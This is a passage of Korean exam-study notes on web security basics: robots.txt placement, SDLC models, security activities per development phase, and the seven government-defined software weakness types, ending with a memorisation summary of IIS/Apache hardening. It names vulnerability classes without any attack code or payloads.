> `httpd`의 `d`는 **daemon(데몬)** 의 약자 → 백그라운드에서 항상 실행 중인 서비스 프로세스

## 3. 검색엔진 정보 노출 취약점 (robots.txt)

### 개요

검색 엔진 크롤러(봇)가 웹 서버를 자동으로 탐색하면서 **의도치 않은 개인정보, 내부 문서가 검색 결과에 노출**될 수 있다.

### robots.txt

검색 엔진 크롤러에게 **접근 허용/차단 경로를 지정**하는 파일.

```
# robots.txt 예시
User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /public/
```

### 중요 규칙 ⭐

robots.txt 파일은 반드시 **웹 사이트 최상위 루트 디렉터리**에 저장해야 한다.

```
https://www.example.com/robots.txt  (O)
https://www.example.com/sub/robots.txt  (X - 효력 없음)
```

## 4. SW 개발 생명주기 (SDLC)

### SDLC 단계

```
[계획/정의]
      ↓
[요구사항 분석]
      ↓
[설계]
      ↓
[구현]
      ↓
[테스트]
      ↓
[유지보수]
```

### 주요 개발 모델 비교

| 모델 | 특징 | 장단점 |
|------|------|--------|
| **폭포수 모델** | 순차적 개발, 이전 단계 완료 후 다음 단계 진행 | 체계적, 변경에 유연하지 않음 |
| **프로토타입 모델** | 시제품(원형) 먼저 제작 후 요구사항 정제 | 요구사항 파악 용이, 반복적 |
| **나선형 모델** | 폭포수 + 프로토타입 장점 + **위험 분석** 추가 | 위험 관리 강점, 복잡함 |

## 5. SW 개발 보안 방법론

### 개요

**SDLC 전체 과정에 걸쳐 보안 활동을 추가**하여 안전한 소프트웨어를 개발하는 방법론.

### 각 단계별 보안 활동

| 단계 | 보안 활동 |
|------|-----------|
| **요구사항 분석** | 보안 요구사항 항목 식별 |
| **설계** | 보안 설계 검토 및 보안 설계서 작성 |
| **구현** | 표준 코딩 정의서 및 SW 개발 보안 가이드 준수 |
| **테스트** | 모의침투 테스트, 동적분석을 통한 취약점 진단 및 개선 |
| **유지보수** | 보안 패치 적용 |

## 6. 소프트웨어 보안약점 유형

> 행정안전부 SW 보안 가이드 기준

### ① 입력데이터 검증 및 표현 ⭐

**정의**: 프로그램 입력값에 대한 검증 누락 또는 부적절한 검증으로 발생

**종류**:
- SQL 삽입 (SQL Injection)
- 경로 조작 및 자원 삽입
- 크로스사이트 스크립트 (XSS)
- 운영체제 명령어 삽입
- 위험한 형식 파일 업로드
- 신뢰되지 않은 URL 주소로 자동 접속 연결
- XPath 삽입 / XQuery 삽입
- 크로스사이트 요청 위조 (CSRF)
- HTTP 응답분할
- 메모리 버퍼 오버플로우
- 포맷 스트링 삽입

---

### ② 보안 기능

**정의**: 인증, 접근제어, 기밀성, 암호화, 권한관리를 적절히 구현하지 않을 때 발생

**종류**:
- 하드코딩된 비밀번호
- 사용자 하드디스크에 저장되는 쿠키를 통한 정보 노출
- 솔트(Salt) 없이 일방향 해시함수 사용

---

### ③ 시간 및 상태

**정의**: 동시 또는 거의 동시 수행을 지원하는 병렬시스템 관련 취약점

**종류**:
- TOCTOU (Time-Of-Check Time-Of-Use): 감사시점과 사용시점의 차이를 악용
- 종료되지 않는 반복문 / 재귀함수

---

### ④ 에러 처리

**정의**: 에러를 처리하지 않거나 불충분하게 처리하여 에러 정보에 중요 시스템 정보가 포함될 때 발생

예: DB 에러 메시지에 테이블명, 컬럼명 등이 그대로 노출

---

### ⑤ 코드 오류

**정의**: 개발자가 범하는 코딩 실수로 유발되는 보안약점

**대표 종류**:
- **Null Pointer 역참조**: Null인 포인터에 값을 대입할 때 발생하는 에러 (Segment Fault 발생)

---

### ⑥ 캡슐화

**정의**: 불충분한 캡슐화로 인해 인가되지 않은 사용자에게 데이터가 노출되는 취약점

---

### ⑦ API 오용

**정의**: 보안에 취약한 API를 사용함으로써 발생하는 보안약점

---

### 보안약점 유형 한눈에 보기

| 유형 | 핵심 키워드 |
|------|-------------|
| 입력데이터 검증 | SQL Injection, XSS, 파일업로드, CSRF |
| 보안 기능 | 하드코딩 PW, 솔트 없는 해시, 쿠키 노출 |
| 시간 및 상태 | TOCTOU, 무한루프 |
| 에러 처리 | 에러 메시지에 시스템 정보 노출 |
| 코드 오류 | Null Pointer 역참조 |
| 캡슐화 | 민감 데이터 외부 노출 |
| API 오용 | 취약한 API 사용 |

## 7. 시험 핵심 암기 요약

### IIS/Apache 보안 핵심

| 항목 | 핵심 대응 |
|------|-----------|
| 업로드 폴더 | 실행 권한 제거 |
| 관리자 페이지 | IP 기반 접근통제 |
| HTTP 메소드 | GET/POST 외 제거 |
| 헤더 정보 | ServerTokens ProductOnly |
| 서버 계정 | nobody/apache (최소 권한) |

### SDLC 개발 모델 비교

| 모델 | 특징 한 줄 요약 |
|------|----------------|
| 폭포수 | 순서대로 진행 |
| 프로토타입 | 시제품 먼저 |
| 나선형 | 반복 + 위험 분석 |

### SW 보안약점 7가지 (암기)
